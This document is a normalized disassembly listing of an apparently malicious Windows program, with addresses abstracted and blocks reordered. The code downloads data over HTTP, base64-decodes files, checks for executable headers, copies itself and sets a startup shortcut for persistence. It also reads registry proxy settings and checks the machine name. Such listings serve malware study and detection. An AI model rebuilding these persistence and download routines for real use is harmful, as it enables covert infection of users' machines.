lea eax [ ebp - 0x314 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
push eax
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x314 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x314 ]
push eax
call sub_405b97
pop ecx
push 0x1
call [ rw-data ]
jmp r-xdata
sub_405d46
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x3e800
mov [ esi ] 0x29
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1 ]
lea ecx [ ebp + 0x8 ]
push 0x1
push ecx
push edi
push eax
push esi
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_4071d7
push edi
mov esi eax
call [ free@IAT ]
add esp 0x24
mov eax esi
sub_405d9e
push ebp
mov ebp esp
sub esp 0x924
push ebx
push esi
xor esi esi
push edi
push esi
push 0x1
pop ebx
push ebx
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push ecx
push 0x8004667e
push eax
call [ Ordinal_WSOCK32_12@IAT ]
mov eax [ rw-data ]
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] 0xa
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x120 ] eax
mov [ ebp - 0x124 ] ebx
call sub_402a10
cmp eax esi
pop ecx
je r-xdata
push eax
call [ Ordinal_WSOCK32_10@IAT ]
push [ ebp + 0xc ]
mov edi eax
mov [ ebp - 0x1c ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
mov [ ebp - 0x1a ] ax
lea eax [ ebp - 0x1c ]
push 0x10
push eax
push [ rw-data ]
mov [ ebp - 0x18 ] edi
call [ rw-data ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x124 ]
push esi
push eax
mov eax [ rw-data ]
push esi
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
push rw-data
push rw-data
lea eax [ ebp - 0x91f ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x91f ]
push eax
call strlen
add eax 0x6
push 0xbb8
mov [ ebp - 0x923 ] eax
push eax
lea eax [ ebp - 0x924 ]
mov [ ebp - 0x924 ] 0x31
push eax
push [ rw-data ]
call sub_4027b3
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x524 ]
push 0x5
push eax
push [ rw-data ]
call sub_403165
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x523 ]
cmp eax 0x5
mov edi eax
jl r-xdata
lea ecx [ eax - 0x5 ]
cmp ecx 0x400
jae r-xdata
add eax 0xfffffffb
push eax
lea eax [ ebp - 0x51f ]
push eax
push [ rw-data ]
call sub_403165
add esp 0xc
test eax eax
jl r-xdata
add [ ebp - 0x524 ] 0x80
lea eax [ ebp - 0x524 ]
push edi
push eax
call sub_4077bf
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
lea eax [ ebp - 0x20 ]
mov [ rw-data ] esi
push eax
push esi
push esi
push sub_4030ae
push esi
push esi
call [ CreateThread@IAT ]
cmp eax esi
mov [ rw-data ] eax
jne r-xdata
push eax
call [ rw-data ]
mov [ rw-data ] esi
mov eax ebx
jmp r-xdata
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
mov [ rw-data ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_405f8e
push ebp
mov ebp esp
mov eax 0x2008
call sub_407dc0
push ebx
push esi
push edi
lea eax [ ebp - 0x2008 ]
push 0x5
push eax
push [ rw-data ]
call sub_403165
add esp 0xc
test eax eax
je r-xdata
push 0x1
pop eax
cmp eax 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
add [ ebp - 0x2008 ] 0x80
lea eax [ ebp - 0x2008 ]
push 0x5
push eax
call sub_4077bf
mov eax [ ebp - 0x2007 ]
pop ecx
pop ecx
lea esi [ eax - 0x5 ]
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
je r-xdata
mov ebx 0x2000
push ebx
push esi
jmp r-xdata
sub esi edi
test esi esi
jle r-xdata
lea eax [ ebp - 0x2008 ]
push edi
push eax
call sub_402833
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x2008 ]
push eax
push [ rw-data ]
call sub_403165
mov edi eax
add esp 0xc
test edi edi
jle r-xdata
jmp r-xdata
cmp esi ebx
jg r-xdata
sub_406033
push ebp
mov ebp esp
push ecx
push ecx
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
and [ rw-data ] 0x0
push 0x5
pop eax
mov [ ebp - 0x8 ] 0x78
mov [ ebp - 0x7 ] eax
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_4077bf
pop ecx
pop ecx
leave
retn
sub_406063
push ebp
mov ebp esp
sub esp 0x104
push 0x0
lea eax [ ebp - 0x104 ]
push 0x18
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
leave
retn
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call strcat
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x104 ]
push eax
call [ DeleteFileA@IAT ]
sub_4060b5
push ebp
mov ebp esp
sub esp 0x310
push esi
xor esi esi
push esi
lea eax [ ebp - 0x108 ]
push 0x18
push eax
push esi
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
push [ ebp + 0x8 ]
lea eax [ ebp - 0x108 ]
push eax
call strcat
lea eax [ ebp - 0x108 ]
push esi
push eax
call [ _access@IAT ]
add esp 0x18
test eax eax
jne r-xdata
push esi
call [ CoInitialize@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x1
push esi
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
cmp [ ebp + 0x14 ] esi
je r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x310 ]
push 0x104
push eax
lea eax [ ebp - 0x108 ]
push 0xffffffff
push eax
push esi
push esi
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x310 ]
push 0x1
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4061ab
push ebp
mov ebp esp
sub esp 0x410
push esi
push edi
mov esi rw-data
mov edi rw-data
push esi
push edi
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x30c ]
push 0x104
xor edi edi
push eax
push edi
call [ GetModuleFileNameA@IAT ]
push edi
lea eax [ ebp - 0x208 ]
push 0x26
push eax
push edi
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
push edi
call sub_406063
pop ecx
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
call strcpy
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x208 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x1c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x208 ]
push 0x1
push eax
push rw-data
push esi
call sub_4060b5
push [ ebp + 0x8 ]
lea eax [ ebp - 0x410 ]
push eax
call strcpy
add esp 0x18
lea ebx [ ebp - 0x410 ]
mov edi rw-data
lea eax [ ebp - 0x208 ]
push edi
push eax
push rw-data
push esi
call sub_4060b5
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x104 ]
push edi
push eax
call strcat
lea eax [ ebp - 0x104 ]
push ebx
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x104 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
test esi esi
je r-xdata
and [ esi ] 0x0
lea eax [ ebp - 0x104 ]
push edi
push eax
call strcat
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x104 ]
push 0x0
push eax
lea eax [ ebp - 0x30c ]
push eax
call [ CopyFileA@IAT ]
pop ebx
lea ebx [ esi + 0x1 ]
jmp r-xdata
push 0x5c
push ebx
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
sub_40631f
push ebp
mov ebp esp
push ecx
push ebx
push rw-data
push [ ebp + 0x8 ]
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
pop ebx
leave
retn
push esi
push edi
mov esi [ fread@IAT ]
push 0x1
pop edi
lea eax [ ebp + 0xb ]
push ebx
push edi
push edi
mov [ ebp - 0x4 ] edi
push eax
push ebx
call [ fclose@IAT ]
mov eax [ ebp - 0x4 ]
pop ecx
pop edi
pop esi
movsx eax [ ebp + 0xb ]
push eax
call [ isalpha@IAT ]
test eax eax
pop ecx
jne r-xdata
push ebx
push edi
lea eax [ ebp + 0xb ]
push edi
push eax
jmp r-xdata
movsx eax [ ebp + 0xb ]
push eax
call [ isdigit@IAT ]
test eax eax
pop ecx
jne r-xdata
call esi
add esp 0x10
test eax eax
je r-xdata
mov al [ ebp + 0xb ]
cmp al 0x2b
je r-xdata
cmp al 0x2f
je r-xdata
cmp al 0x3d
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xa
jne r-xdata
and [ ebp - 0x4 ] 0x0
sub_4063ac
push ebp
mov ebp esp
sub esp 0x114
and [ ebp - 0xc7 ] 0x0
push ebx
mov bl 0xff
push esi
push edi
mov [ ebp - 0x108 ] bl
mov [ ebp - 0x107 ] bl
mov [ ebp - 0x106 ] bl
mov [ ebp - 0x105 ] bl
mov [ ebp - 0x104 ] bl
mov [ ebp - 0x103 ] bl
mov [ ebp - 0x102 ] bl
mov [ ebp - 0x101 ] bl
mov [ ebp - 0x100 ] bl
mov [ ebp - 0xff ] bl
mov [ ebp - 0xfe ] bl
mov [ ebp - 0xfd ] bl
mov [ ebp - 0xfc ] bl
mov [ ebp - 0xfb ] bl
mov [ ebp - 0xfa ] bl
mov [ ebp - 0xf9 ] bl
mov [ ebp - 0xf8 ] bl
mov [ ebp - 0xf7 ] bl
mov [ ebp - 0xf6 ] bl
mov [ ebp - 0xf5 ] bl
mov [ ebp - 0xf4 ] bl
mov [ ebp - 0xf3 ] bl
mov [ ebp - 0xf2 ] bl
mov [ ebp - 0xf1 ] bl
mov [ ebp - 0xf0 ] bl
mov [ ebp - 0xef ] bl
mov [ ebp - 0xee ] bl
mov [ ebp - 0xed ] bl
mov [ ebp - 0xec ] bl
mov [ ebp - 0xeb ] bl
mov [ ebp - 0xea ] bl
mov [ ebp - 0xe9 ] bl
mov [ ebp - 0xe8 ] bl
mov [ ebp - 0xe7 ] bl
mov [ ebp - 0xe6 ] bl
mov [ ebp - 0xe5 ] bl
mov [ ebp - 0xe4 ] bl
mov [ ebp - 0xe3 ] bl
mov [ ebp - 0xe2 ] bl
mov [ ebp - 0xe1 ] bl
mov [ ebp - 0xe0 ] bl
mov [ ebp - 0xdf ] bl
mov [ ebp - 0xde ] bl
mov [ ebp - 0xdd ] 0x3e
mov [ ebp - 0xdc ] bl
mov [ ebp - 0xdb ] bl
mov [ ebp - 0xda ] bl
mov [ ebp - 0xd9 ] 0x3f
mov [ ebp - 0xd8 ] 0x34
mov [ ebp - 0xd7 ] 0x35
mov [ ebp - 0xd6 ] 0x36
mov [ ebp - 0xd5 ] 0x37
mov [ ebp - 0xd4 ] 0x38
mov [ ebp - 0xd3 ] 0x39
mov [ ebp - 0xd2 ] 0x3a
mov [ ebp - 0xd1 ] 0x3b
mov [ ebp - 0xd0 ] 0x3c
mov [ ebp - 0xcf ] 0x3d
mov [ ebp - 0xce ] bl
mov [ ebp - 0xcd ] bl
mov [ ebp - 0xcc ] bl
mov [ ebp - 0xcb ] bl
mov [ ebp - 0xca ] bl
mov [ ebp - 0xc9 ] bl
mov [ ebp - 0xc8 ] bl
mov [ ebp - 0xc6 ] 0x1
mov [ ebp - 0xc5 ] 0x2
mov [ ebp - 0xc4 ] 0x3
mov [ ebp - 0xc3 ] 0x4
mov [ ebp - 0xc2 ] 0x5
mov [ ebp - 0xc1 ] 0x6
mov [ ebp - 0xc0 ] 0x7
mov [ ebp - 0xbf ] 0x8
mov [ ebp - 0xbe ] 0x9
mov [ ebp - 0xbd ] 0xa
mov [ ebp - 0xbc ] 0xb
mov [ ebp - 0xbb ] 0xc
mov [ ebp - 0xba ] 0xd
mov [ ebp - 0xb9 ] 0xe
mov [ ebp - 0xb8 ] 0xf
mov [ ebp - 0xb7 ] 0x10
mov [ ebp - 0xb6 ] 0x11
mov [ ebp - 0xb5 ] 0x12
mov [ ebp - 0xb4 ] 0x13
mov [ ebp - 0xb3 ] 0x14
mov [ ebp - 0xb2 ] 0x15
mov [ ebp - 0xb1 ] 0x16
mov [ ebp - 0xb0 ] 0x17
mov [ ebp - 0xaf ] 0x18
mov [ ebp - 0xae ] 0x19
mov [ ebp - 0xad ] bl
mov [ ebp - 0xac ] bl
mov [ ebp - 0xab ] bl
mov [ ebp - 0xaa ] bl
mov [ ebp - 0xa9 ] bl
mov [ ebp - 0xa8 ] bl
mov [ ebp - 0xa7 ] 0x1a
mov [ ebp - 0xa6 ] 0x1b
mov [ ebp - 0xa5 ] 0x1c
mov [ ebp - 0xa4 ] 0x1d
mov [ ebp - 0xa3 ] 0x1e
mov [ ebp - 0xa2 ] 0x1f
mov [ ebp - 0xa1 ] 0x20
mov [ ebp - 0xa0 ] 0x21
mov [ ebp - 0x9f ] 0x22
mov [ ebp - 0x9e ] 0x23
mov [ ebp - 0x9d ] 0x24
mov [ ebp - 0x9c ] 0x25
mov [ ebp - 0x9b ] 0x26
mov [ ebp - 0x9a ] 0x27
mov [ ebp - 0x99 ] 0x28
mov [ ebp - 0x98 ] 0x29
mov [ ebp - 0x97 ] 0x2a
mov [ ebp - 0x96 ] 0x2b
mov [ ebp - 0x95 ] 0x2c
mov [ ebp - 0x94 ] 0x2d
mov [ ebp - 0x93 ] 0x2e
mov [ ebp - 0x92 ] 0x2f
mov [ ebp - 0x91 ] 0x30
mov [ ebp - 0x90 ] 0x31
mov [ ebp - 0x8f ] 0x32
mov [ ebp - 0x8e ] 0x33
mov [ ebp - 0x8d ] bl
mov [ ebp - 0x8c ] bl
mov [ ebp - 0x8b ] bl
mov [ ebp - 0x8a ] bl
mov [ ebp - 0x89 ] bl
mov [ ebp - 0x88 ] bl
mov [ ebp - 0x87 ] bl
mov [ ebp - 0x86 ] bl
mov [ ebp - 0x85 ] bl
mov [ ebp - 0x84 ] bl
mov [ ebp - 0x83 ] bl
mov [ ebp - 0x82 ] bl
mov [ ebp - 0x81 ] bl
mov [ ebp - 0x80 ] bl
mov [ ebp - 0x7f ] bl
mov [ ebp - 0x7e ] bl
mov [ ebp - 0x7d ] bl
mov [ ebp - 0x7c ] bl
mov [ ebp - 0x7b ] bl
mov [ ebp - 0x7a ] bl
mov [ ebp - 0x79 ] bl
mov [ ebp - 0x78 ] bl
mov [ ebp - 0x77 ] bl
mov [ ebp - 0x76 ] bl
mov [ ebp - 0x75 ] bl
mov [ ebp - 0x74 ] bl
mov [ ebp - 0x73 ] bl
mov [ ebp - 0x72 ] bl
mov [ ebp - 0x71 ] bl
mov [ ebp - 0x70 ] bl
mov [ ebp - 0x6f ] bl
mov [ ebp - 0x6e ] bl
mov [ ebp - 0x6d ] bl
mov [ ebp - 0x6c ] bl
mov [ ebp - 0x6b ] bl
mov [ ebp - 0x6a ] bl
mov [ ebp - 0x69 ] bl
mov [ ebp - 0x68 ] bl
mov [ ebp - 0x67 ] bl
mov [ ebp - 0x66 ] bl
mov [ ebp - 0x65 ] bl
mov [ ebp - 0x64 ] bl
mov [ ebp - 0x63 ] bl
mov [ ebp - 0x62 ] bl
mov [ ebp - 0x61 ] bl
mov [ ebp - 0x60 ] bl
mov [ ebp - 0x5f ] bl
mov [ ebp - 0x5e ] bl
mov [ ebp - 0x5d ] bl
mov [ ebp - 0x5c ] bl
mov [ ebp - 0x5b ] bl
mov [ ebp - 0x5a ] bl
mov [ ebp - 0x59 ] bl
mov [ ebp - 0x58 ] bl
mov [ ebp - 0x57 ] bl
mov [ ebp - 0x56 ] bl
mov [ ebp - 0x55 ] bl
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x53 ] bl
mov [ ebp - 0x52 ] bl
mov [ ebp - 0x51 ] bl
mov [ ebp - 0x50 ] bl
mov [ ebp - 0x4f ] bl
mov [ ebp - 0x4e ] bl
mov [ ebp - 0x4d ] bl
mov [ ebp - 0x4c ] bl
mov [ ebp - 0x4b ] bl
mov [ ebp - 0x4a ] bl
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x47 ] bl
mov [ ebp - 0x46 ] bl
mov [ ebp - 0x45 ] bl
mov [ ebp - 0x44 ] bl
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x42 ] bl
mov [ ebp - 0x41 ] bl
mov [ ebp - 0x40 ] bl
mov [ ebp - 0x3f ] bl
mov [ ebp - 0x3e ] bl
mov [ ebp - 0x3d ] bl
mov [ ebp - 0x3c ] bl
mov [ ebp - 0x3b ] bl
mov [ ebp - 0x3a ] bl
mov [ ebp - 0x39 ] bl
mov [ ebp - 0x38 ] bl
mov [ ebp - 0x37 ] bl
mov [ ebp - 0x36 ] bl
mov [ ebp - 0x35 ] bl
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x33 ] bl
mov [ ebp - 0x32 ] bl
mov [ ebp - 0x31 ] bl
mov [ ebp - 0x30 ] bl
mov [ ebp - 0x2f ] bl
mov [ ebp - 0x2e ] bl
mov [ ebp - 0x2d ] bl
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x2b ] bl
mov [ ebp - 0x2a ] bl
mov [ ebp - 0x29 ] bl
mov [ ebp - 0x28 ] bl
mov [ ebp - 0x27 ] bl
mov [ ebp - 0x26 ] bl
mov [ ebp - 0x25 ] bl
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x23 ] bl
mov [ ebp - 0x22 ] bl
mov [ ebp - 0x21 ] bl
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] bl
mov [ ebp - 0x1e ] bl
mov [ ebp - 0x1d ] bl
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x1b ] bl
mov [ ebp - 0x1a ] bl
mov esi [ fopen@IAT ]
push rw-data
push [ ebp + 0x8 ]
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x18 ] bl
mov [ ebp - 0x17 ] bl
mov [ ebp - 0x16 ] bl
mov [ ebp - 0x15 ] bl
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x13 ] bl
mov [ ebp - 0x12 ] bl
mov [ ebp - 0x11 ] bl
mov [ ebp - 0x10 ] bl
mov [ ebp - 0xf ] bl
mov [ ebp - 0xe ] bl
mov [ ebp - 0xd ] bl
mov [ ebp - 0xc ] bl
mov [ ebp - 0xb ] bl
mov [ ebp - 0xa ] bl
mov [ ebp - 0x9 ] bl
call esi
push rw-data
mov edi eax
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
call esi
add esp 0x10
mov [ ebp - 0x114 ] eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x110 ] 0x0
and [ ebp - 0x10c ] 0x0
mov esi [ fread@IAT ]
push edi
push 0x1
lea eax [ ebp + 0xb ]
pop edi
push edi
push edi
push eax
push edi
call [ fclose@IAT ]
pop ecx
movzx eax [ ebp + 0xb ]
mov al [ ebp + eax - 0x108 ]
mov [ ebp + 0xf ] al
movzx eax [ ebp + 0xb ]
cmp [ ebp + eax - 0x108 ] bl
jne r-xdata
push [ ebp - 0x8 ]
mov esi [ fclose@IAT ]
call esi
push [ ebp - 0x114 ]
call esi
pop ecx
mov eax edi
pop ecx
movzx eax [ ebp + 0xb ]
mov cl [ ebp + eax - 0x108 ]
cmp cl bl
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp + 0xb ]
push edi
push edi
push eax
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp + 0xb ]
push edi
push edi
push eax
call esi
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x110 ]
push 0x3
xor edx edx
pop edi
div edi
test edx edx
jne r-xdata
call esi
add esp 0x10
test eax eax
je r-xdata
push 0x1
pop edi
cmp edx edi
jne r-xdata
cmp [ ebp - 0x10c ] edx
je r-xdata
cmp edx 0x2
jne r-xdata
mov al [ ebp + 0xf ]
shr cl 0x2
shl al 0x4
or cl al
mov [ ebp - 0x1 ] cl
jmp r-xdata
mov al [ ebp + 0xf ]
push 0x1
shr cl 0x4
shl al 0x2
or cl al
pop edi
mov [ ebp - 0x1 ] cl
jmp r-xdata
and [ ebp - 0x10c ] edx
push 0x1
mov [ ebp + 0xf ] cl
pop edi
jmp r-xdata
push [ ebp - 0x114 ]
lea eax [ ebp - 0x1 ]
push edi
push edi
push eax
call [ fwrite@IAT ]
movzx eax [ ebp + 0xb ]
add esp 0x10
inc [ ebp - 0x110 ]
mov al [ ebp + eax - 0x108 ]
mov [ ebp + 0xf ] al
jmp r-xdata
mov al [ ebp + 0xf ]
mov [ ebp - 0x10c ] edi
shl al 0x6
or al cl
mov [ ebp - 0x1 ] al
sub_4069f4
push ebp
mov ebp esp
push esi
push rw-data
push [ ebp + 0x8 ]
call [ fopen@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
xor eax eax
push esi
push 0x2
lea eax [ ebp + 0xa ]
push 0x1
push eax
call [ fread@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x14
cmp [ ebp + 0xa ] 0x5a4d
jne r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_406a39
push ebp
mov ebp esp
sub esp 0x8c
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov edi eax
xor esi esi
cmp edi esi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
push edi
push esi
push rw-data
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] esi
push 0x50
push rw-data
call sub_4071d7
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push edi
call [ free@IAT ]
pop ecx
mov eax esi
mov eax [ ebp - 0x4 ]
push ebx
and [ eax + edi ] 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8c ]
push eax
mov [ ebp - 0xc ] 0x80
call [ GetComputerNameA@IAT ]
lea esi [ edi - 0x2 ]
pop edi
pop esi
leave
retn
mov esi [ ebp - 0x8 ]
pop ebx
test esi esi
je r-xdata
lea ebx [ esi + 0x2 ]
push 0xd
push ebx
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
push ebx
call strcmp
pop ecx
test eax eax
pop ecx
jne r-xdata
and [ esi ] 0x0
mov eax [ ebp - 0x4 ]
add eax edi
cmp esi eax
jae r-xdata
mov [ ebp - 0x8 ] 0x1
sub_406af7
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov edi eax
xor esi esi
cmp edi esi
pop ecx
mov [ ebp - 0x4 ] edi
je r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
push esi
push eax
push edi
push esi
push rw-data
push [ ebp + 0x8 ]
push 0x50
push rw-data
call sub_4071d7
add esp 0x20
test eax eax
jne r-xdata
mov edi [ SHGetSpecialFolderPathA@IAT ]
push esi
lea eax [ ebp - 0x214 ]
push 0x26
push eax
push esi
call edi
push [ ebp + 0xc ]
mov ebx [ sprintf@IAT ]
lea eax [ ebp - 0x214 ]
push rw-data
push eax
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call ebx
add esp 0x14
lea eax [ ebp - 0x110 ]
push esi
push 0x26
push eax
push esi
call edi
push rw-data
lea eax [ ebp - 0x110 ]
push rw-data
push eax
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call ebx
add esp 0x14
lea eax [ ebp - 0x110 ]
push esi
push 0x20
push 0x2
push esi
push esi
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push edi
jmp r-xdata
lea eax [ ebp - 0xc ]
push esi
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push edi
call [ WriteFile@IAT ]
push edi
mov ebx eax
call [ CloseHandle@IAT ]
push [ ebp - 0x4 ]
call [ free@IAT ]
cmp ebx esi
pop ecx
je r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0x110 ]
push eax
call sub_40631f
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x214 ]
push esi
push eax
lea eax [ ebp - 0x110 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x110 ]
push eax
call sub_4063ac
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x214 ]
push eax
call sub_405082
pop ecx
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x110 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x214 ]
push eax
call sub_4069f4
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_406c7c
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
xor edi edi
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push [ ebp + 0x8 ]
push 0x50
push rw-data
call sub_4071d7
add esp 0x20
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push rw-data
push esi
and [ eax + esi ] 0x0
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
xor edi edi
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
push 0x1
pop edi
sub_406ce7
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ esp + 0x8 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4071d7
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
push 0x1
pop edi
pop edi
pop esi
pop ecx
retn
sub_406d38
cmp [ rw-data ] 0x0
push esi
mov esi [ free@IAT ]
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call esi
pop ecx
call [ Ordinal_WSOCK32_116@IAT ]
push 0x1
call [ exit@IAT ]
push 0x0
call esi
pop ecx
sub_406d6a
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
leave
retn
sub_406dae
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
xor ebx ebx
push 0x1
push ebx
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
push eax
push rw-data
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x100
call esi
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp edi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ strstr@IAT ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
lea edi [ ebp - 0x108 ]
add edi 0x5
jmp r-xdata
push eax
push rw-data
call strcpy
inc esi
push esi
call [ atoi@IAT ]
add esp 0xc
mov [ rw-data ] eax
push 0x1
pop eax
jmp r-xdata
push 0x3a
push edi
call [ strchr@IAT ]
